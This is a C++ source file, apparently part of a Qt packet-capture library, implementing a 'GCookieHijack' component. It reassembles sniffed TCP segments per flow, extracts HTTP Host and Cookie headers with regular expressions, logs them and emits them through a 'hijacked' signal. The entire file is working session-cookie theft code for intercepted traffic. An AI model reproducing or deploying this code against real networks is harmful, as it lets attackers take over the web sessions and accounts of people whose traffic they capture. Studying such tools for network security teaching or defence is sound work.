#include "gcookiehijack.h"

// ----------------------------------------------------------------------------
// GCookieHijack
// ----------------------------------------------------------------------------
bool GCookieHijack::doOpen() {
	if (tcpFlowMgr_ == nullptr) {
		SET_ERR(GErr::ObjectIsNull, "tcpFlowMgr is null");
		return false;
	}
	tcpFlowOffset_ = tcpFlowMgr_->requestItems_.request(this, sizeof(Item));
	tcpFlowMgr_->managables_.insert(this);

	reHost_.setPattern("Host: ([^\\r]*)\\r");
	reCookie_.setPattern("Cookie: ([^\\r]*)\\r");

	return true;

}

bool GCookieHijack::doClose() {
	return true;
}

void GCookieHijack::tcpFlowCreated(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	// qDebug() << QString("_tcpFlowDetected %1:%2>%3:%4").arg(QString(tcpFlowKey.sip_), QString::number(tcpFlowKey.sport_), QString(tcpFlowKey.dip_), QString::number(tcpFlowKey.dport_)); // gilgil temp 2021.04.07
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	new (item) Item(this);
}

void GCookieHijack::tcpFlowDeleted(GFlow::TcpFlowKey tcpFlowKey, GTcpFlowMgr::TcpFlowValue* tcpFlowValue) {
	(void)tcpFlowKey;
	Item* item = getItem(tcpFlowValue);
	item->~Item();
	// qDebug() << QString("_tcpFlowDeleted %1:%2>%3:%4").arg(QString(tcpFlowKey.sip_), QString::number(tcpFlowKey.sport_), QString(tcpFlowKey.dip_), QString::number(tcpFlowKey.dport_)); // gilgil temp 2021.04.07
}

void GCookieHijack::hijack(GPacket* packet) {
	GIpHdr* ipHdr = packet->ipHdr_;
	if (ipHdr == nullptr) return;
	GTcpHdr* tcpHdr = packet->tcpHdr_;
	if (tcpHdr == nullptr) return;

	GBuf tcpData = packet->tcpData_;
	if (!tcpData.valid()) return;
	QString segment = QString::fromLatin1(pchar(tcpData.data_), tcpData.size_);

	Q_ASSERT(tcpFlowMgr_->currentTcpFlowVal_ != nullptr);
	Item* item = getItem(tcpFlowMgr_->currentTcpFlowVal_);
	item->insertSegment(tcpHdr->seq(), segment);

	QString host;
	QString cookie;
	if (!item->extract(host, cookie))
		return;

	qDebug() << host << cookie; // gilgil temp
	emit hijacked(packet, host, cookie);
}

// ----------------------------------------------------------------------------
// GCookieHijack::Item
// ----------------------------------------------------------------------------
void GCookieHijack::Item::insertSegment(uint32_t seq, QString segment) {
	segments_.insert(seq, segment);
	while (segments_.count() > ch_->maxMergeCount_) {
		segments_.erase(segments_.begin());
	}
}

bool GCookieHijack::Item::extract(QString& host, QString &cookie) {
	QString http;
	uint32_t nextSeq = 0;
	for (Map::iterator it = segments_.begin(); it != segments_.end(); it++) {
		uint32_t seq = it.key();
		QString& segment = it.value();
		if (nextSeq == 0 || seq == nextSeq) {
			nextSeq = seq + segment.size();
			http += segment;
		}
	}

	QRegularExpressionMatch m = ch_->reHost_.match(http);
	if (!m.hasMatch()) return false;
	host = m.captured(1);

	m = ch_->reCookie_.match(http);
	if (!m.hasMatch()) return false;
	cookie = m.captured(1);

	segments_.clear();
	return true;
}
